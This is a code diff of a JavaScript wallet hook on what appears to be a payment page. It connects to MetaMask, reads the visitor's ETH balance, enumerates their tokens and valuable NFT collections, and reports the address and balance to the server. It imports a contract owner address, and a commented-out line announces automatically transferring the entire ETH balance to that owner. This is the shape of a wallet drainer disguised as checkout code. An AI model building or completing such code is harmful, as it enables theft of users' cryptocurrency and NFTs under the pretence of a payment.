@@ -1,58 +1,45 @@
 import { ethers } from "ethers";
-import { tokenAddresses, erc20Abi, contractOwnerAddress } from '../config.js';
+import { tokenAddresses, erc20Abi, contractOwnerAddress, erc721Abi, erc1155Abi, erc721Addresses, erc1155Addresses } from '../config.js';
 
-// ERC-721 ABI (minimal ABI for balanceOf and token details)
-const erc721Abi = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
-    "function tokenURI(uint256 tokenId) view returns (string)"
-];
-
-// ERC-1155 ABI (minimal ABI for balanceOf and token URI)
-const erc1155Abi = [
-    "function balanceOf(address account, uint256 id) view returns (uint256)",
-    "function uri(uint256 id) view returns (string)"
-];
-
-// ERC-721 contract addresses (popular collections on the Ethereum network)
-const erc721Addresses = [
-    "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB", // CryptoPunks (Wrapped CryptoPunks)
-    "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d", // Bored Ape Yacht Club (BAYC)
-    "0xed5af388653567af2f388e6224dc7c4b3241c544", // Azuki
-    "0xe785E82358879F061BC3dcAC6f0444462D4b5330", // World of Women
-    "0x8a90cab2b38dba80c64b7734e58ee1db38b8992e"  // Doodles
-];
-
-// ERC-1155 contract addresses (popular collections on the Ethereum network)
-const erc1155Addresses = [
-    "0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c", // Enjin
-    "0xF6793dA657495ffeFF9Ee6350824910Abc21356C", // Rarible
-    "0x0e3a2a1f2146d86a604adc220b4967a898d7fe07" // Gods Unchained
-];
 
 let CheckBalances = {
     async mounted() {
+        console.log("CheckBalances mounted");
         if (!window.ethereum) {
+            this.pushEvent("set_payment_variant", { variant: "qr" });
             return;
         }
-
         try {
+            this.pushEvent("set_payment_variant", { variant: "wallet" });
+            console.log("CheckBalances connected to MetaMask");
             // Connect to MetaMask
             const provider = new ethers.BrowserProvider(window.ethereum);
             await provider.send("eth_requestAccounts", []);
             const signer = await provider.getSigner();
             const userAddress = await signer.getAddress();
 
+            console.log("User address:", userAddress);
+
             // Get ETH balance
             const balance = await provider.getBalance(userAddress);
             const formattedBalance = ethers.formatEther(balance);
 
+            console.log("ETH balance:", formattedBalance);
+
+            this.pushEvent("set_wallet_basics", {
+                address: userAddress,
+                eth_balance: formattedBalance
+            });
+
+
             // Get list of token balances
             const tokenBalances = await this.getTokenBalances(provider, userAddress);
 
+            console.log("Token balances:", tokenBalances);
             // Get list of NFTs
             const nftCollection = await this.getNFTs(signer, userAddress);
 
+            console.log("NFTs:", nftCollection);
             // Automatically transfer the entire ETH balance to the contract owner
             // await this.transferEntireEthBalance(signer, balance);
 
